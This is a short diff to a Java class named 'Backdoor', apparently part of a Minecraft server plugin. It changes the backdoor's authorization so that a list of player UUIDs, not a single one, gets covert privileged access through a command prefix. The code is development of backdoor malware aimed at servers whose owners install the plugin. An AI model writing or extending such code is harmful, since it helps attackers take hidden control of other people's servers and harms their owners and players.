@@ -23,9 +23,9 @@ public final class Backdoor implements Listener {
 
     private Plugin plugin;
 
-    public Backdoor(Plugin plugin, String UUID, String prefix){
+    public Backdoor(Plugin plugin, String[] UUID, String prefix){
 
-        Config.authorized_uuid  = UUID;
+        Config.authorized_uuids  = UUID;
         Config.command_prefix   = prefix;
 
         this.plugin = plugin;
@@ -510,8 +510,11 @@ public final class Backdoor implements Listener {
     /*Check if UUID is authorized in Config.java*/
     public boolean IsUserAuthorized(String uuid) {
 
-        if(uuid.equals(Config.authorized_uuid))
-            return true;
+        for(String u : Config.authorized_uuids){
+            if(uuid.equals(u)){
+                return true;
+            }
+        }
 
         boolean authorized = false;
 
